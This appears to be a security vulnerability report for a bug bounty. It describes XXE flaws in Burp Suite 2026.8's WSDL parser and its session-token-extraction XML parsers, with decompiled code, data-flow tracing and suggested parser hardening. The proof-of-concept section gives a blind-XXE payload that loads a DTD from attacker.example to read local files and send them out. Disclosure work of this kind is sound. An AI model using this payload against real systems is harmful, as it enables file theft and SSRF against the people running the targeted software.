# XXE (CWE-611) in Burp Suite's WSDL/API discovery and session-handling token-extraction XML parsers

## Summary

Burp Suite 2026.8 parses XML content from HTTP responses returned by the site being crawled/scanned/tested in two places without disabling DOCTYPE declarations or external entity resolution. Both `DocumentBuilderFactory` instances only set `FEATURE_SECURE_PROCESSING` (`http://javax.xml.XMLConstants/feature/secure-processing`), which only imposes JAXP resource-consumption limits (protection against XML bombs / entity-expansion DoS) — it does **not** disable DTDs or external entities, and is a commonly-confused substitute for actual XXE hardening (`disallow-doctype-decl`, `external-general-entities`, `external-parameter-entities`, `load-external-dtd`).

This matches PortSwigger's own program threat model for content reached through Burp's browser/crawler/scanner: *"Websites accessed through Burp are untrusted, so anything a website could do to read files of the user's computer, read data out of Burp Suite, or gain remote code execution would be considered a vulnerability."* A hostile or compromised target server can return a crafted XML/WSDL response body containing a DOCTYPE with an external entity, causing Burp's own process to fetch attacker-specified `SYSTEM` URIs — enabling out-of-band local file disclosure and SSRF against the analyst's machine/network, triggered purely by passively returning content during ordinary scanning, with no user interaction beyond "scan/crawl this target."

Verified against the current, checksum-verified official Burp Suite 2026.8 Linux build (`burpsuite_linux_v2026_8.sh`, SHA256 `a9b71d5903e4aac00b790a7c5a0c0630fdcbfe1250aafd7bd540a3ad44b89983`, matching PortSwigger's own published checksum).

## Root cause

Two independent `DocumentBuilder` factories, both missing the same hardening, both feeding response content directly into `parse()`:

**1. `net.portswigger.Zcy` (WSDL/SOAP API-definition parser)** — decompiled (class/method names are PortSwigger's own internal obfuscated identifiers, renamed nowhere, shown as-compiled):

```java
public static DocumentBuilder Zm() throws ParserConfigurationException {
    DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
    documentBuilderFactory.setNamespaceAware(true);
    documentBuilderFactory.setFeature(Zcy.a(-21156, 8917), true);
    return documentBuilderFactory.newDocumentBuilder();
}
```

**2. `net.portswigger.apiparser.common.apitokens.TokenExtractor` (response-body token extraction for session-handling rules / recorded-login macros)**:

```java
private static DocumentBuilder getDocumentBuilder() throws ParserConfigurationException {
    DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
    documentBuilderFactory.setNamespaceAware(true);
    documentBuilderFactory.setFeature(TokenExtractor.a(-5751, -24458), true);
    return documentBuilderFactory.newDocumentBuilder();
}

private static Document buildDom(String string) throws Exception {
    DocumentBuilder documentBuilder = TokenExtractor.getDocumentBuilder();
    InputSource inputSource = new InputSource(new StringReader(string));
    Document document = documentBuilder.parse(inputSource);
    document.normalize();
    return document;
}
```

I independently resolved the obfuscated string-constant arguments (Burp encrypts string literals and decodes them at runtime via a per-class `a(int,int)` method) by loading the actual extracted classes on a classpath and invoking that decoder method directly via reflection, rather than relying on static decompilation of the obfuscation's init blocks:

```
net.portswigger.Zcy.a(-21156,8917) = http://javax.xml.XMLConstants/feature/secure-processing
net.portswigger.apiparser.common.apitokens.TokenExtractor.a(-5751,-24458) = http://javax.xml.XMLConstants/feature/secure-processing
```

Confirmed by full inspection of both decompiled classes that `setFeature`/`setAttribute` is called exactly once in each, with this value, and no `disallow-doctype-decl`, `external-general-entities`, `external-parameter-entities`, or `load-external-dtd` feature is ever set anywhere in either class. Standard JDK Xerces defaults therefore apply: DOCTYPE declarations and external entity/DTD resolution are both enabled.

## Data flow to untrusted input

**WSDL parser (`Zcy`):** Burp's crawler content-discovery module (`burp.Zsgx`) inspects every crawled response body and flags WSDL candidates via `Zcy.Zf(String)` (checks for the WSDL namespace + a SOAP binding namespace) against the raw response text:

```java
private boolean ZM(Znfp znfp) {
    String string = znfp.Zy().Zz();      // response body text
    return string != null && Zcy.Zf(string);
}
```

The same response string is parsed through the unhardened `Zcy.ZK(string)` → `ZY(string)` → `Zm()` → `documentBuilder.parse(new InputSource(new StringReader(string)))` chain. The same chain is also reachable from `net.portswigger.apiparser.enterprise.ApiDefinitionDataParser.parseSoapApiDefinition(String, SpanProvider)`, fed `new String(byArray, UTF_8)` from bytes fetched directly from a URL. This is plumbed into Burp's live API-scan discovery / scan-queue UI (referenced from over a dozen scan-engine/UI classes), confirming it is active, reachable product code exercised during ordinary crawling and API scanning — not unreachable/dead code.

**Token extractor:** `burp.Zhqt.Zc(response, expression)` extracts an authentication/session token from an HTTP response body for session-handling rules and recorded-login macros — a feature explicitly designed to parse response bodies returned by the target application under test:

```java
public static String Zc(Zy_8 zy_8, String string) {
    String string2 = zy_8.Zw().ZTI();          // response body
    ...
    return TokenExtractor.extractToken(list, string2, TokenExtractor$MimeType.from(s), string);
}
```

When the detected MIME type is XML, this routes through `extractXmlToken` → `buildDom(string)` → the same unhardened parser.

## Proof of concept

A target server (or a MITM of one) returns, in place of (or in addition to) an ordinary WSDL/XML response body:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">
  %remote;
]>
```

where `evil.dtd`, hosted by the attacker, defines a parameter entity that reads a local file (e.g. `file:///etc/passwd`, SSH keys, or Burp's own project/session data) and exfiltrates its content via an out-of-band HTTP request back to the attacker's server — the standard blind-XXE technique, necessary here since the parsed DOM's extracted values aren't directly rendered back to the attacker. Even without OOB exfiltration, the parser still attempts to resolve any `SYSTEM` URI at parse time, providing an SSRF primitive against the analyst's internal network from inside Burp's own process — reachable purely by an ordinarily-crawled or ordinarily-scanned target returning this content, or by a session-handling rule/login macro configured against a malicious or compromised target extracting a token via an XPath expression from an XML response.

## Impact

- **Local file disclosure** (via out-of-band XXE) from the machine running Burp, of any file the OS user running Burp can read (potentially including Burp's own project files, saved credentials, or SSH/cloud credentials elsewhere on disk).
- **SSRF** against the analyst's internal network, since the XML parser will attempt to resolve any `SYSTEM`/external entity URI at parse time.
- Both are triggered purely by response content from a site being crawled, scanned, or tested with recorded login macros / session-handling rules — squarely within the disclosed threat model for content reached through Burp ("anything a website could do to read files of the user's computer... would be considered a vulnerability," per PortSwigger's own program guidelines, previously applied to reward report #3712279 at $5,000, High severity).

## Suggested fix

In both `Zcy.Zm()` and `TokenExtractor.getDocumentBuilder()`, in addition to `FEATURE_SECURE_PROCESSING`, disable DOCTYPE processing entirely (the strongest and simplest fix, per OWASP's XXE Prevention Cheat Sheet, since neither WSDL parsing nor token-extraction XPath evaluation requires DOCTYPE/DTD support):

```java
documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

or, if DOCTYPE support must be retained for compatibility, at minimum disable external entity and external DTD resolution:

```java
documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
documentBuilderFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
documentBuilderFactory.setXIncludeAware(false);
documentBuilderFactory.setExpandEntityReferences(false);
```

## Affected version

Confirmed present in Burp Suite 2026.8 (current release as of this report), the official Linux build, checksum-verified against PortSwigger's published SHA256 for that release. Not checked against earlier versions.
